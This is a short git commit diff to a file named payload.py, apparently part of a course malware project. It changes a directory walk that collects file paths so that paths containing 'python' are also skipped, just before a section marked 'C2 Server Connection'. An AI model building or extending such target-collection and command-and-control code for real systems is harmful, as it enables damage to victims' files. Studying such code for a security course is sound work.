efbfbba9e996ad1f907b88e96d0164b7fece6387
Artur Sahakyan <artursahakyan8@gmail.com>
2024-11-25 09:43:02 -0800

    can't believe I forgot this

--- payload.py
+++ payload.py
@@ -63,7 +63,7 @@ def load_file_paths():
         for name in files:
             path = os.path.join(root, name)
             global file_paths
-            if "cecs378" not in path.lower():
+            if "cecs378" not in path.lower() and "python" not in path.lower():
                 file_paths.append(os.path.join(root, name))
 
 # C2 Server Connection
